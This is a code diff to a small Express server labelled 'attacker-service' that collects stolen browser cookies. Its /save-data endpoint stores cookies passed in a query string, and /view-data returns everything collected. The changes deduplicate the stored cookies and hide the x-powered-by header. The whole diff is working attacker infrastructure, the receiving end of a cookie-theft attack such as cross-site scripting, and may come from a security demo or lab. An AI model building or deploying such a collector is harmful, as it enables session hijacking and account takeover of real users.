@@ -6,21 +6,24 @@ import {createLogger} from "bunyan";
 const logger = createLogger({ name: 'attacker-service' });
 
 const app = express();
-const data = [];
+const data = new Set();
 
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(cookieParser());
 
+app.disable('x-powered-by');
+
 app.get('/view-data', (req, res) => {
-  logger.info(data.map(i=>decodeURIComponent(i.cookies)));
-  res.json(data.map(i=>decodeURIComponent(i.cookies)));
+  const dataAsArray = Array(...data);
+  logger.info(dataAsArray);
+  res.json(dataAsArray);
 });
 
 app.get('/save-data', (req, res) => {
-  data.push(req.query);
-  logger.info('Saved data: ', req.query);
+  data.add(decodeURIComponent(req.query.cookies));
+  logger.info('Saved data: ', req.query.cookies);
   res.end();
 });
 
